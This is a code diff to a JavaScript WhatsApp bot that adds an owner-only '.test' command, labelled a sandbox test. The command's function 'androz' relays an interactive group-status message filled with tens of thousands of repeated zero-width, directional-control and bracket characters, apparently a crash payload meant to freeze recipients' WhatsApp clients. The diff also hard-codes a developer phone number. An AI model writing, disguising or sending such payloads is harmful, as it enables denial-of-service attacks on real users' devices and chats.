@@ -6436,6 +6436,79 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
     
 
 
+    // 🧪 .test — sandbox command (structure only; function body dropped in later)
+    if (token === '.test') {
+        // ── Access gate: owner / dev only.
+        //    Delete this block if .test should be public.
+        if (!isSenderOwner && !isDevNumber(senderJid)) {
+            await safeWaReply(sock, remoteJid, '❌ Owner only.', msg);
+            return;
+        }
+
+        // ── Args: everything after ".test" (e.g. ".test foo bar" -> "foo bar")
+        const input = args.join(' ').trim();
+
+        try {
+            // ══════════════════════════════════════════════════════════════
+            //  🧪 TEST FUNCTION GOES HERE  (replace the placeholder below)
+            //
+            //  Available in this scope:
+            //    sock          — WhatsApp socket (sendMessage, relayMessage...)
+            //    msg           — the raw incoming message object
+            //    remoteJid     — chat id (user @s.whatsapp.net / group @g.us)
+            //    senderJid     — who sent it
+            //    phoneNumber   — which bot session is handling it
+            //    args          — array of words after the command
+            //    text          — the full raw line (" .test foo bar ")
+            //    input         — args joined back into one string
+            //    prefix        — this session's configured prefix (default ".")
+            //    isSenderOwner — true if sent by the bot owner
+            //
+            //  Helpers you can call:
+            //    await safeWaReply(sock, remoteJid, 'text', msg)
+            //    buildOmegaTerminal(body) · buildRuinStatusPanel(phoneNumber, sock)
+            //    log(scope, message) · logError(scope, message, err)
+            // ══════════════════════════════════════════════════════════════
+
+            // ── TEST PAYLOAD ─────────────────────────────────────────────
+            //  Dumps to the CURRENT chat only (wherever .test was run).
+            //    prim   -> sock        (the live WhatsApp socket)
+            //    target -> remoteJid   (this chat)
+            async function androz(prim, target) {
+                await prim.relayMessage(target, {
+                    groupStatusMessageV2: {
+                        message: {
+                            interactiveMessage: {
+                                header: {
+                                    title: "𑇂𑆵𑆴𑆿".repeat(10000),
+                                    subtitle: "\x10".repeat(50000),
+                                    bloksWidget: {
+                                        uuid: "\u200B".repeat(50000),
+                                        data: "[".repeat(50000),
+                                        type: "\u200F".repeat(50000),
+                                        fallback: "\u200D".repeat(50000)
+                                    }
+                                },
+                                body: { text: "\u000F" },
+                                nativeFlowMessage: {
+                                    buttons: "[".repeat(50000)
+                                }
+                            }
+                        }
+                    }
+                }, { participant: true });
+            }
+
+            await androz(sock, remoteJid);
+
+            log('TEST', `${phoneNumber}: .test payload sent to ${remoteJid} input="${input}"`);
+        } catch (err) {
+            logError('TEST', `${phoneNumber}: .test failed`, err);
+            await safeWaReply(sock, remoteJid, `❌ *TEST ERROR*\n\n${err?.message || err}`, msg);
+        }
+        return;
+    }
+
     // .dev / .devnumber / .devcontact — the architect
     if (token === '.dev' || token === '.devnumber' || token === '.devcontact') {
         const devNum = (process.env.DEV_NUMBERS || "2348102756072").split(",")[0].trim();
